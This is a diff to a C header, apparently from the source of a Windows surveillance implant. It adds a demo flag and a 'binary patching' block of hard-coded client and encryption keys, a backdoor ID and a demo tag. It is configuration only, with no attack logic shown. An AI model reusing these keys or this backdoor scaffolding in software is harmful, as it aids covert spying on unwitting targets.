@@ -52,6 +52,8 @@ extern char H4DRIVER_NAME[];
 extern char REGISTRY_KEY_NAME[];
 extern char EXE_INSTALLER_NAME[];
 
+extern BOOL is_demo_version;
+
 #define COMMON_CODEC_NAME "codec"
 #define COMMON_UPDATE_NAME "core"
 #define COMMON_UPDATE64_NAME "dll64"
@@ -87,8 +89,23 @@ extern char EXE_INSTALLER_NAME[];
 // Versione del client 
 #define CLIENT_VERSION "2011101701"
 
+// -------- Elementi per il binary patching ---------
 // Chiave UNIVOCA fra server e client
 #define CLIENT_KEY "A02H90JL00000000"
+//#define CLIENT_KEY "f7Hk0f5usd04apdvqw13F5ed25soV5eD"
+
+#define ENCRYPTION_KEY "ngkdNGKDh4H4883"
+//#define ENCRYPTION_KEY "3j9WmmDgBqyU270FTid3719g64bP4s52"
+
+#define ENCRYPTION_KEY_CONF "ngkdNGKDh4H4869"
+//#define ENCRYPTION_KEY_CONF "Adf5V57gQtyi90wUhpb8Neg56756j87R"
+
+#define BACKDOOR_ID "RCS_0000000691"
+//#define BACKDOOR_ID "av3pVck1gb4eR2"
+
+#define DEMO_TAG "hxVtdxJ/Z8LvK3ULSnKRUmLE"
+
+//----------------------------------------------------
 
 #define WRAPPER_MAX_SHARED_MEM 0x40 // Dimensione di un blocco di shared mem dedicato
                                     // alla configurazione di wrapper e agenti.
